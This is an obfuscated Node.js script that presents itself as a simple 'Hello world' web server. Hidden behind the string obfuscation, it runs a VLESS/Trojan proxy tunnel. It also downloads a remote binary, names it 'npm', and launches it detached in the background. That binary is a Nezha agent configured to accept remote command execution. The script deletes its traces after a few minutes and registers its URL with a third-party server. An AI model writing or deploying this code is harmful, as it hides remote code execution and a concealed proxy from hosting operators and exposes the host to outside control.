function _0x2658(_0x41b036,_0x1b7cd9){const _0x54209d=_0x5420();return _0x2658=function(_0x2658c5,_0x35f19e){_0x2658c5=_0x2658c5-0xc8;let _0x392376=_0x54209d[_0x2658c5];return _0x392376;},_0x2658(_0x41b036,_0x1b7cd9);}const _0x373d22=_0x2658;(function(_0x29889e,_0x5c4fbe){const _0x2d129d=_0x2658,_0x45864e=_0x29889e();while(!![]){try{const _0xf35fe4=-parseInt(_0x2d129d(0x125))/0x1+-parseInt(_0x2d129d(0x136))/0x2+parseInt(_0x2d129d(0x105))/0x3+-parseInt(_0x2d129d(0xc9))/0x4+parseInt(_0x2d129d(0x11f))/0x5*(-parseInt(_0x2d129d(0xde))/0x6)+-parseInt(_0x2d129d(0x11a))/0x7*(-parseInt(_0x2d129d(0x10c))/0x8)+parseInt(_0x2d129d(0x129))/0x9;if(_0xf35fe4===_0x5c4fbe)break;else _0x45864e['push'](_0x45864e['shift']());}catch(_0x5ee39e){_0x45864e['push'](_0x45864e['shift']());}}}(_0x5420,0x4de73));function _0x5420(){const _0x218f96=['write','arm64','11047869uaFJFQ','once','pipe','createServer','net','text/html','from','get','createHash','country','false','readUInt8','2087','503382CKjcww','trojan://','url','aarch64','crypto','https://amd64.ssss.nyc.mn/v1','ps\x20aux\x20|\x20grep\x20-v\x20\x22grep\x22\x20|\x20grep\x20\x22./[n]pm\x22','send','NEZHA_KEY','https://speed.cloudflare.com/meta','2011620QFvRqn','npm','slice','\x20with\x20all\x20DNS\x20servers','asOrganization','https://oooo.serv00.net/add-url','config.yaml','axios','9013dac6-4b0b-4b5c-8ee3-0be71944ad95','PORT','base64','path','https://arm64.ssss.nyc.mn/agent','Server','arch','decode','child_process','log','writeFileSync','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','8443','2784678qHocJa','SUB_PATH','npm\x20is\x20already\x20running,\x20skip\x20running...','writeHead','includes','2053','Failed\x20to\x20resolve\x20','NAME','443','2096','AUTO_ACCESS','then','NEZHA_SERVER','Not\x20Found\x0a','Answer','1234.abc.com','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','join','data','close','&path=%2F','concat','reduce','Status','DOMAIN','env','application/dns-json','readUInt16BE','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','arm','setsid\x20nohup\x20./npm\x20-c\x20config.yaml\x20>/dev/null\x202>&1\x20&','stream','utf-8','https://dns.google/resolve?name=','error','length','end','error:\x20','toString','1308513VOvKQH','every','createWriteStream','buffer','npm\x20is\x20running','https://arm64.ssss.nyc.mn/v1','test','24wBBQli','digest','Hug','message','update','split','Automatic\x20Access\x20Task\x20added\x20successfully','index.html','pop','https://','catch','UUID','connect','utf8','966364CVXjEg','npm\x20running\x20error:','/bin/bash','replace','2083','5niAjJU','&fp=chrome&type=ws&host=','https://amd64.ssss.nyc.mn/agent','NEZHA_PORT','map','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','540068fGKTIi','listen'];_0x5420=function(){return _0x218f96;};return _0x5420();}const os=require('os'),http=require('http'),fs=require('fs'),axios=require(_0x373d22(0xd0)),net=require(_0x373d22(0x12d)),path=require(_0x373d22(0xd4)),crypto=require(_0x373d22(0x13a)),{Buffer}=require(_0x373d22(0x108)),{exec,execSync}=require(_0x373d22(0xd9)),{WebSocket,createWebSocketStream}=require('ws'),UUID=process[_0x373d22(0xf7)][_0x373d22(0x117)]||_0x373d22(0xd1),NEZHA_SERVER=process[_0x373d22(0xf7)][_0x373d22(0xea)]||'',NEZHA_PORT=process[_0x373d22(0xf7)][_0x373d22(0x122)]||'',NEZHA_KEY=process[_0x373d22(0xf7)][_0x373d22(0x13e)]||'',DOMAIN=process['env'][_0x373d22(0xf6)]||_0x373d22(0xed),AUTO_ACCESS=process['env'][_0x373d22(0xe8)]||!![],WSPATH=process[_0x373d22(0xf7)]['WSPATH']||UUID[_0x373d22(0xcb)](0x0,0x8),SUB_PATH=process[_0x373d22(0xf7)][_0x373d22(0xdf)]||'sub',NAME=process[_0x373d22(0xf7)][_0x373d22(0xe5)]||_0x373d22(0x10e),PORT=process[_0x373d22(0xf7)][_0x373d22(0xd2)]||0x1eb4;let ISP='';const GetISP=async()=>{const _0x5ce99d=_0x373d22;try{const _0x6b842e=await axios['get'](_0x5ce99d(0xc8)),_0x16b9ee=_0x6b842e[_0x5ce99d(0xf0)];ISP=(_0x16b9ee[_0x5ce99d(0x132)]+'-'+_0x16b9ee[_0x5ce99d(0xcd)])[_0x5ce99d(0x11d)](/ /g,'_');}catch(_0x2f0094){ISP='Unknown';}};GetISP();const httpServer=http[_0x373d22(0x12c)]((_0xba7ad3,_0x1edc3e)=>{const _0x56853e=_0x373d22;if(_0xba7ad3[_0x56853e(0x138)]==='/'){const _0xee78e7=path['join'](__dirname,_0x56853e(0x113));fs['readFile'](_0xee78e7,_0x56853e(0x119),(_0x2e85b4,_0xdab2ab)=>{const _0x4438d9=_0x56853e;if(_0x2e85b4){_0x1edc3e[_0x4438d9(0xe1)](0xc8,{'Content-Type':_0x4438d9(0x12e)}),_0x1edc3e[_0x4438d9(0x102)]('Hello\x20world!');return;}_0x1edc3e['writeHead'](0xc8,{'Content-Type':_0x4438d9(0x12e)}),_0x1edc3e['end'](_0xdab2ab);});return;}else{if(_0xba7ad3[_0x56853e(0x138)]==='/'+SUB_PATH){const _0x3641a9='vless://'+UUID+'@'+DOMAIN+':443?encryption=none&security=tls&sni='+DOMAIN+_0x56853e(0x120)+DOMAIN+_0x56853e(0xf2)+WSPATH+'#'+NAME+'-'+ISP,_0x5060c9=_0x56853e(0x137)+UUID+'@'+DOMAIN+':443?security=tls&sni='+DOMAIN+_0x56853e(0x120)+DOMAIN+_0x56853e(0xf2)+WSPATH+'#'+NAME+'-'+ISP,_0x26e4cb=_0x3641a9+'\x0a'+_0x5060c9,_0x323e60=Buffer[_0x56853e(0x12f)](_0x26e4cb)[_0x56853e(0x104)](_0x56853e(0xd3));_0x1edc3e[_0x56853e(0xe1)](0xc8,{'Content-Type':'text/plain'}),_0x1edc3e[_0x56853e(0x102)](_0x323e60+'\x0a');}else _0x1edc3e[_0x56853e(0xe1)](0x194,{'Content-Type':'text/plain'}),_0x1edc3e[_0x56853e(0x102)](_0x56853e(0xeb));}}),wss=new WebSocket[(_0x373d22(0xd6))]({'server':httpServer}),uuid=UUID[_0x373d22(0x11d)](/-/g,''),DNS_SERVERS=['8.8.4.4','1.1.1.1'];function resolveHost(_0x2152ba){return new Promise((_0x50e9c9,_0x668b34)=>{const _0x17f594=_0x2658;if(/^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/[_0x17f594(0x10b)](_0x2152ba)){_0x50e9c9(_0x2152ba);return;}let _0x53eae5=0x0;function _0x448352(){const _0x3f8d0e=_0x17f594;if(_0x53eae5>=DNS_SERVERS[_0x3f8d0e(0x101)]){_0x668b34(new Error(_0x3f8d0e(0xe4)+_0x2152ba+_0x3f8d0e(0xcc)));return;}const _0xa4fa0=DNS_SERVERS[_0x53eae5];_0x53eae5++;const _0x273842=_0x3f8d0e(0xff)+encodeURIComponent(_0x2152ba)+'&type=A';axios['get'](_0x273842,{'timeout':0x1388,'headers':{'Accept':_0x3f8d0e(0xf8)}})[_0x3f8d0e(0xe9)](_0x24ecc8=>{const _0x16b5be=_0x3f8d0e,_0x406fe5=_0x24ecc8['data'];if(_0x406fe5[_0x16b5be(0xf5)]===0x0&&_0x406fe5[_0x16b5be(0xec)]&&_0x406fe5[_0x16b5be(0xec)][_0x16b5be(0x101)]>0x0){const _0x5b5e33=_0x406fe5[_0x16b5be(0xec)]['find'](_0x21d741=>_0x21d741['type']===0x1);if(_0x5b5e33){_0x50e9c9(_0x5b5e33[_0x16b5be(0xf0)]);return;}}_0x448352();})[_0x3f8d0e(0x116)](_0x787b08=>{_0x448352();});}_0x448352();});}function handleVlessConnection(_0x4e0be4,_0x492c6c){const _0x4130c1=_0x373d22,[_0xc8fcad]=_0x492c6c,_0x18cb2c=_0x492c6c[_0x4130c1(0xcb)](0x1,0x11);if(!_0x18cb2c[_0x4130c1(0x106)]((_0x39a2df,_0x5f2216)=>_0x39a2df==parseInt(uuid['substr'](_0x5f2216*0x2,0x2),0x10)))return![];let _0x1f720e=_0x492c6c[_0x4130c1(0xcb)](0x11,0x12)[_0x4130c1(0x134)]()+0x13;const _0x2a2110=_0x492c6c[_0x4130c1(0xcb)](_0x1f720e,_0x1f720e+=0x2)[_0x4130c1(0xf9)](0x0),_0x2d529e=_0x492c6c['slice'](_0x1f720e,_0x1f720e+=0x1)['readUInt8'](),_0x64bda7=_0x2d529e==0x1?_0x492c6c[_0x4130c1(0xcb)](_0x1f720e,_0x1f720e+=0x4)[_0x4130c1(0xef)]('.'):_0x2d529e==0x2?new TextDecoder()[_0x4130c1(0xd8)](_0x492c6c[_0x4130c1(0xcb)](_0x1f720e+0x1,_0x1f720e+=0x1+_0x492c6c['slice'](_0x1f720e,_0x1f720e+0x1)[_0x4130c1(0x134)]())):_0x2d529e==0x3?_0x492c6c[_0x4130c1(0xcb)](_0x1f720e,_0x1f720e+=0x10)[_0x4130c1(0xf4)]((_0x432b28,_0x42e3ef,_0x5ab5d4,_0x2cffd6)=>_0x5ab5d4%0x2?_0x432b28[_0x4130c1(0xf3)](_0x2cffd6['slice'](_0x5ab5d4-0x1,_0x5ab5d4+0x1)):_0x432b28,[])[_0x4130c1(0x123)](_0x3e1866=>_0x3e1866[_0x4130c1(0xf9)](0x0)[_0x4130c1(0x104)](0x10))[_0x4130c1(0xef)](':'):'';_0x4e0be4[_0x4130c1(0x13d)](new Uint8Array([_0xc8fcad,0x0]));const _0x5eaaa7=createWebSocketStream(_0x4e0be4);return resolveHost(_0x64bda7)[_0x4130c1(0xe9)](_0x273986=>{const _0x286710=_0x4130c1;net[_0x286710(0x118)]({'host':_0x273986,'port':_0x2a2110},function(){const _0x5a3221=_0x286710;this[_0x5a3221(0x127)](_0x492c6c[_0x5a3221(0xcb)](_0x1f720e)),_0x5eaaa7['on'](_0x5a3221(0x100),()=>{})[_0x5a3221(0x12b)](this)['on'](_0x5a3221(0x100),()=>{})[_0x5a3221(0x12b)](_0x5eaaa7);})['on']('error',()=>{});})['catch'](_0x8a226e=>{const _0x556e85=_0x4130c1;net['connect']({'host':_0x64bda7,'port':_0x2a2110},function(){const _0x5f1565=_0x2658;this[_0x5f1565(0x127)](_0x492c6c[_0x5f1565(0xcb)](_0x1f720e)),_0x5eaaa7['on'](_0x5f1565(0x100),()=>{})['pipe'](this)['on'](_0x5f1565(0x100),()=>{})[_0x5f1565(0x12b)](_0x5eaaa7);})['on'](_0x556e85(0x100),()=>{});}),!![];}function handleTrojanConnection(_0x5f10e8,_0x5dec72){const _0x2fcf21=_0x373d22;try{if(_0x5dec72[_0x2fcf21(0x101)]<0x3a)return![];const _0x371a7f=_0x5dec72[_0x2fcf21(0xcb)](0x0,0x38)[_0x2fcf21(0x104)](),_0x1d98c8=[UUID];let _0x380796=null;for(const _0x3a1841 of _0x1d98c8){const _0x4e4e2b=crypto[_0x2fcf21(0x131)]('sha224')[_0x2fcf21(0x110)](_0x3a1841)[_0x2fcf21(0x10d)]('hex');if(_0x4e4e2b===_0x371a7f){_0x380796=_0x3a1841;break;}}if(!_0x380796)return![];let _0xf4bf98=0x38;_0x5dec72[_0xf4bf98]===0xd&&_0x5dec72[_0xf4bf98+0x1]===0xa&&(_0xf4bf98+=0x2);const _0x5677c0=_0x5dec72[_0xf4bf98];if(_0x5677c0!==0x1)return![];_0xf4bf98+=0x1;const _0x46cf8a=_0x5dec72[_0xf4bf98];_0xf4bf98+=0x1;let _0x53f8fa,_0x1df9b3;if(_0x46cf8a===0x1)_0x53f8fa=_0x5dec72[_0x2fcf21(0xcb)](_0xf4bf98,_0xf4bf98+0x4)['join']('.'),_0xf4bf98+=0x4;else{if(_0x46cf8a===0x3){const _0x4a8a82=_0x5dec72[_0xf4bf98];_0xf4bf98+=0x1,_0x53f8fa=_0x5dec72['slice'](_0xf4bf98,_0xf4bf98+_0x4a8a82)[_0x2fcf21(0x104)](),_0xf4bf98+=_0x4a8a82;}else{if(_0x46cf8a===0x4)_0x53f8fa=_0x5dec72['slice'](_0xf4bf98,_0xf4bf98+0x10)[_0x2fcf21(0xf4)]((_0x4b1cd3,_0x5cacc7,_0x458bd1,_0x58cf85)=>_0x458bd1%0x2?_0x4b1cd3[_0x2fcf21(0xf3)](_0x58cf85[_0x2fcf21(0xcb)](_0x458bd1-0x1,_0x458bd1+0x1)):_0x4b1cd3,[])[_0x2fcf21(0x123)](_0x120d3f=>_0x120d3f[_0x2fcf21(0xf9)](0x0)[_0x2fcf21(0x104)](0x10))['join'](':'),_0xf4bf98+=0x10;else return![];}}_0x1df9b3=_0x5dec72[_0x2fcf21(0xf9)](_0xf4bf98),_0xf4bf98+=0x2;_0xf4bf98<_0x5dec72[_0x2fcf21(0x101)]&&_0x5dec72[_0xf4bf98]===0xd&&_0x5dec72[_0xf4bf98+0x1]===0xa&&(_0xf4bf98+=0x2);const _0x63eb1c=createWebSocketStream(_0x5f10e8);return resolveHost(_0x53f8fa)[_0x2fcf21(0xe9)](_0x14a3db=>{const _0x3240ef=_0x2fcf21;net[_0x3240ef(0x118)]({'host':_0x14a3db,'port':_0x1df9b3},function(){const _0x18f84d=_0x3240ef;_0xf4bf98<_0x5dec72[_0x18f84d(0x101)]&&this[_0x18f84d(0x127)](_0x5dec72['slice'](_0xf4bf98)),_0x63eb1c['on']('error',()=>{})[_0x18f84d(0x12b)](this)['on'](_0x18f84d(0x100),()=>{})[_0x18f84d(0x12b)](_0x63eb1c);})['on'](_0x3240ef(0x100),()=>{});})['catch'](_0x4d45ae=>{const _0x33b5d5=_0x2fcf21;net[_0x33b5d5(0x118)]({'host':_0x53f8fa,'port':_0x1df9b3},function(){const _0x462312=_0x33b5d5;_0xf4bf98<_0x5dec72[_0x462312(0x101)]&&this[_0x462312(0x127)](_0x5dec72['slice'](_0xf4bf98)),_0x63eb1c['on']('error',()=>{})[_0x462312(0x12b)](this)['on'](_0x462312(0x100),()=>{})[_0x462312(0x12b)](_0x63eb1c);})['on'](_0x33b5d5(0x100),()=>{});}),!![];}catch(_0x28bbea){return![];}}wss['on']('connection',(_0x781abc,_0x5d3978)=>{const _0x323064=_0x373d22,_0x221b36=_0x5d3978[_0x323064(0x138)]||'';_0x781abc[_0x323064(0x12a)](_0x323064(0x10f),_0x5ce2d5=>{const _0x25125a=_0x323064;if(_0x5ce2d5[_0x25125a(0x101)]>0x11&&_0x5ce2d5[0x0]===0x0){const _0x398c13=_0x5ce2d5[_0x25125a(0xcb)](0x1,0x11),_0x2e19b4=_0x398c13[_0x25125a(0x106)]((_0x20b157,_0x2b7436)=>_0x20b157==parseInt(uuid['substr'](_0x2b7436*0x2,0x2),0x10));if(_0x2e19b4){!handleVlessConnection(_0x781abc,_0x5ce2d5)&&_0x781abc[_0x25125a(0xf1)]();return;}}!handleTrojanConnection(_0x781abc,_0x5ce2d5)&&_0x781abc['close']();})['on']('error',()=>{});});const getDownloadUrl=()=>{const _0x5d3ee5=_0x373d22,_0x27c02d=os[_0x5d3ee5(0xd7)]();return _0x27c02d===_0x5d3ee5(0xfb)||_0x27c02d===_0x5d3ee5(0x128)||_0x27c02d===_0x5d3ee5(0x139)?!NEZHA_PORT?_0x5d3ee5(0x10a):_0x5d3ee5(0xd5):!NEZHA_PORT?_0x5d3ee5(0x13b):_0x5d3ee5(0x121);},downloadFile=async()=>{const _0x36af40=_0x373d22;if(!NEZHA_SERVER&&!NEZHA_KEY)return;try{const _0x2e3ce2=getDownloadUrl(),_0x3922ae=await axios({'method':_0x36af40(0x130),'url':_0x2e3ce2,'responseType':_0x36af40(0xfd)}),_0x81de26=fs[_0x36af40(0x107)]('npm');return _0x3922ae['data'][_0x36af40(0x12b)](_0x81de26),new Promise((_0x50ed50,_0x4c2820)=>{const _0x4bf4be=_0x36af40;_0x81de26['on']('finish',()=>{const _0x598f39=_0x2658;console[_0x598f39(0xda)]('npm\x20download\x20successfully'),exec('chmod\x20+x\x20npm',_0x488c25=>{if(_0x488c25)_0x4c2820(_0x488c25);_0x50ed50();});}),_0x81de26['on'](_0x4bf4be(0x100),_0x4c2820);});}catch(_0x5ed033){throw _0x5ed033;}},runnz=async()=>{const _0x201a2c=_0x373d22;try{const _0xcf25ac=execSync(_0x201a2c(0x13c),{'encoding':_0x201a2c(0xfe)});if(_0xcf25ac['trim']()!==''){console['log'](_0x201a2c(0xe0));return;}}catch(_0x5ba3fd){}await downloadFile();let _0x3019e2='',_0x3d38fe=[_0x201a2c(0xe6),_0x201a2c(0xdd),_0x201a2c(0xe7),_0x201a2c(0x135),_0x201a2c(0x11e),_0x201a2c(0xe3)];if(NEZHA_SERVER&&NEZHA_PORT&&NEZHA_KEY){const _0x5db3dc=_0x3d38fe[_0x201a2c(0xe2)](NEZHA_PORT)?'--tls':'';_0x3019e2='setsid\x20nohup\x20./npm\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+'\x20-p\x20'+NEZHA_KEY+'\x20'+_0x5db3dc+_0x201a2c(0x124);}else{if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x10e670=NEZHA_SERVER[_0x201a2c(0xe2)](':')?NEZHA_SERVER[_0x201a2c(0x111)](':')[_0x201a2c(0x114)]():'',_0x734c9a=_0x3d38fe[_0x201a2c(0xe2)](_0x10e670)?'true':_0x201a2c(0x133),_0x5dc8eb='client_secret:\x20'+NEZHA_KEY+_0x201a2c(0xdc)+NEZHA_SERVER+_0x201a2c(0xee)+_0x734c9a+_0x201a2c(0xfa)+UUID;fs[_0x201a2c(0xdb)](_0x201a2c(0xcf),_0x5dc8eb);}_0x3019e2=_0x201a2c(0xfc);}else{console[_0x201a2c(0xda)]('NEZHA\x20variable\x20is\x20empty,\x20skip\x20running');return;}}try{exec(_0x3019e2,{'shell':_0x201a2c(0x11c)},_0x90c15f=>{const _0x143843=_0x201a2c;if(_0x90c15f)console[_0x143843(0x100)](_0x143843(0x11b),_0x90c15f);else console['log'](_0x143843(0x109));});}catch(_0x40ada6){console[_0x201a2c(0x100)](_0x201a2c(0x103)+_0x40ada6);}};async function addAccessTask(){const _0x2ddf5a=_0x373d22;if(!AUTO_ACCESS)return;if(!DOMAIN)return;const _0x52a0e2=_0x2ddf5a(0x115)+DOMAIN+'/'+SUB_PATH;try{const _0x37b2f3=await axios['post'](_0x2ddf5a(0xce),{'url':_0x52a0e2},{'headers':{'Content-Type':'application/json'}});console['log'](_0x2ddf5a(0x112));}catch(_0x22d05a){}}const delFiles=()=>{const _0x4f0545=_0x373d22;fs['unlink'](_0x4f0545(0xca),()=>{}),fs['unlink'](_0x4f0545(0xcf),()=>{});};httpServer[_0x373d22(0x126)](PORT,()=>{runnz(),setTimeout(()=>{delFiles();},0x2bf20),addAccessTask(),console['log']('Server\x20is\x20running\x20on\x20port\x20'+PORT);});
